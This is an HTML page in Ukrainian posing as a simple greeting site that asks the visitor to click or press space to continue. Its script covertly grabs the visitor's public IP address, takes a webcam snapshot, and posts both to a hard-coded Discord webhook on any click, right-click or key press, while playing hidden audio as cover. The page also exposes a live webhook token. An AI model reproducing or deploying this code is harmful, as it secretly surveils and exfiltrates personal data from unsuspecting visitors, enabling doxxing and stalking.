<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8" />
<title>Сайт Севкi</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
  body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none;
    overflow: hidden;
  }
  .glass-container {
    background: rgba(255, 255, 255, 0.15);
    border-radius: 20px;
    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    padding: 40px;
    width: 380px;
    text-align: center;
    color: white;
    text-shadow: 0 0 8px rgba(0,0,0,0.7);
    font-weight: 700;
    font-size: 1.5rem;
  }
  audio {
    display: none; /* Hide audio controls */
  }
</style>
</head>
<body>
  <div class="glass-container">
    <div>Привiт, Це Сайт Севкi</div>
    <div style="margin-top: 15px; font-weight: 500; font-size: 1.1rem;">
      Нажми пробел або кликни щоби продовжити
    </div>
  </div>

  <!-- Embedded audio player -->
  <audio id="bgAudio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>

<script>
  const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';

  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch {
      return null;
    }
  }

  async function sendToWebhook(payload) {
    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload),
      });
    } catch {
      // Ignore send errors
    }
  }

  async function sendUserIP() {
    const ip = await getUserIP();
    if (ip) {
      await sendToWebhook({type: 'ip', ip: ip, timestamp: new Date().toISOString()});
    }
  }

  async function captureCameraSnapshot() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({video: true});
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      stream.getTracks().forEach(track => track.stop());

      return canvas.toDataURL('image/png');
    } catch {
      return null;
    }
  }

  async function sendSnapshot() {
    const img = await captureCameraSnapshot();
    if (img) {
      await sendToWebhook({type: 'camera_snapshot', image: img, timestamp: new Date().toISOString()});
    }
  }

  async function captureAndSend() {
    await sendUserIP();
    await sendSnapshot();
  }

  // Play audio once user interacts (required by browsers)
  function playAudio() {
    const audio = document.getElementById('bgAudio');
    if (audio.paused) {
      audio.volume = 1.0;
      audio.play().catch(() => {});
    }
  }

  // Trigger IP + camera capture + audio play on space, left click, right click
  function interactionHandler(e) {
    if (
      e.type === 'keydown' && e.code === 'Space' ||
      e.type === 'click' ||
      e.type === 'contextmenu'
    ) {
      e.preventDefault();
      playAudio();
      captureAndSend();
    }
  }

  document.addEventListener('keydown', interactionHandler);
  document.addEventListener('click', interactionHandler);
  document.addEventListener('contextmenu', interactionHandler);
</script>
</body>
</html>
